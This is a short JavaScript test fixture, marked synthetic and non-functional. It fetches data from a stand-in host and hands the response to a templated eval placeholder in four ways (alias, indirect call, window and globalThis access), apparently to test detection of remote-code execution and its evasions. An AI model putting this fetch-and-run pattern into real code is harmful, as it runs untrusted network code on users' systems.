// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");

axios.get("https://payload.example.invalid/e").then((r) => {
  const run = {{EVAL}};
  run(r.data);
  (0, {{EVAL}})(r.data);
  window.{{EVAL}}(r.data);
  globalThis["{{EVAL}}"](r.data);
});
